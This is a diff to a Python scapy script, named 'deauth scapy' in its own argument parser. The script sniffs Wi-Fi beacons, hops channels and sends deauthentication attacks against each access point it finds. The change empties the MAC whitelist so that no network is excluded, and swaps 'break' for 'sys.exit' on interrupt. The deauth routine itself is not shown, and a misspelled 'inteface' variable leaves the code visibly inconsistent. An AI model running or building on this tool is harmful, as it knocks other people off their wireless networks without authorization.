@@ -7,7 +7,8 @@ from multiprocessing import Process
 
 inteface   = ''
 count      = 6
-white_list = ['48:5b:39:85:ae:52'] 
+white_list = [''] 
+#white_list = ['48:5b:39:85:ae:52'] 
 
 def packet_sniffer():
     pkt     = sniff(iface=interface, timeout=1, lfilter= lambda x: x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp))
@@ -41,7 +42,7 @@ def channel_hopper():
             os.system("iw dev %s set channel %d" % (interface, channel))
             time.sleep(0.5)
         except KeyboardInterrupt:
-            break
+            sys.exit(0)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='deauth scapy')
@@ -67,4 +68,4 @@ if __name__ == "__main__":
             for pkt in pkt_ssid:
                 deauth(pkt)
         except KeyboardInterrupt:
-            break
+            sys.exit(0)
